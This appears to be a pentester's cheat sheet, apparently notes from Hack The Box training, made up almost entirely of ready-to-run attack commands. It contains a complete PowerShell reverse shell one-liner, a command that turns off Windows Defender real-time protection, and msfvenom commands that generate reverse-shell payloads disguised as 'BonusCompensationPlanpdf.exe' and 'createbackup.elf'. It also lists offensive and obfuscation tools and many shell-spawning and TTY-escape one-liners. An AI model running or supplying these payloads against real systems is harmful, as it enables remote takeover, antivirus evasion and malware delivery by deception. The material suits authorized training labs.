
### <span style="color:lightgreen">Windows </span>

-----
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.1.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Disable AV
```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

-----
### <span style="color:lightgreen">Stageless payload </span>

```powershell
Sauuron@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf # Linux

Sauuron@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe # Windows
```

### <span style="color:yellow">Handy resrouces</span>

| Resource                        | Description                                                                                                                                                                                                                                                                                                       |
| ------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| MSFVenom & Metasploit-Framework | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| Payloads All The Things         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| Mythic C2 Framework             | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| Nishang                         | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| Darkarmour                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |

### <span style="color:lightgreen"> Spawning Interactive shells </span>
```sh
/bin/sh -i
```

- Perl
```perl
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```

-  Ruby
```ruby
ruby: exec "/bin/sh"
```

- lua
```lua
lua: os.execute('/bin/sh')
```

- awk
```shell
awk 'BEGIN {system("/bin/sh")}'
```

- Using Find For a Shell
```shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
```

- vim
```shell
vim -c ':!/bin/sh'
```

- vim escape
```shell
vim
:set shell=/bin/sh
:shell
```



### Spanw TTY


```shell
-   `python -c 'import pty; pty.spawn("/bin/sh")'`
    
-   `echo os.system('/bin/bash')`

-   `/bin/sh -i`

-   `script -qc /bin/bash /dev/null`

-   `perl -e 'exec "/bin/sh";'`

-   perl: `exec "/bin/sh";`

-   ruby: `exec "/bin/sh"`

-   lua: `os.execute('/bin/sh')`
    
-   IRB: `exec "/bin/sh"`
    
-   vi: `:!bash`
    
-   vi: `:set shell=/bin/bash:shell`
    
-   nmap: `!sh`
```
